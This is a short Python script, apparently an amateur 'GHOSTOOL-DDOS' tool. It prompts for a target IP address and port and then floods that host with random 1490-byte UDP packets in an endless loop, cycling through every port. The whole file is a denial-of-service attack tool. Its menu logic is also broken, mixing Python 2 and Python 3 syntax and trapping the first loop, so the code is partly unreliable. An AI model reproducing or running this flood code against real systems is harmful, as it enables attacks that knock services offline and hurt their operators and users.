import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############
ans=True
while ans:
    print("""
   [1].start DDoS
   [2].exit
   """)
ans=input("Choose:")
if  ans=="1":

    os.system("clear")
    os.system("figlet GHOSTOOL-DDOS")

    print
    print "----------*GHOST56*---------------"
    print

    ip = raw_input("TARGET IP: ")
    port = input  ("PORT     : ")

    os.system("clear")
    os.system("figlet ENGAGE")
    print "DDOS STARTING"
    time.sleep(3)
    os.system("clear")
    os.system("figlet DDOS")
    time.sleep(2)

    sent = 0
    while True:
        sock.sendto(bytes, (ip,port))
        sent = sent + 1
        port = port + 1
        print "Sent %s packet to %s throught Port"%(sent,ip)
        if port == 65534:
           port = 1
else:
    exit()
